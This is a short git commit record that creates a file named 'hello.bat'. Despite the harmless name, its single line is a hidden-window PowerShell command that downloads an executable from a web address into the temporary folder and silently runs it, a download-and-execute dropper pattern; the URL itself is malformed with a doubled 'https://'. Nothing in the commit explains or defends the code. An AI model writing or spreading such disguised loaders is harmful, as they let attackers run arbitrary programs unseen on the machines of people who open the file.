82678c725220d7a62c353c937ac7a9acc6aa5beb
LilHack <43441041+Lil-hack@users.noreply.github.com>
2025-07-11 00:26:49 +0300

    Create hello.bat

---
+++ hello.bat
@@ -0,0 +1,1 @@
+powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'https://https://github.com/file.exe' -OutFile '%TEMP%\file.exe'; Start-Process -WindowStyle Hidden '%TEMP%\file.exe'"
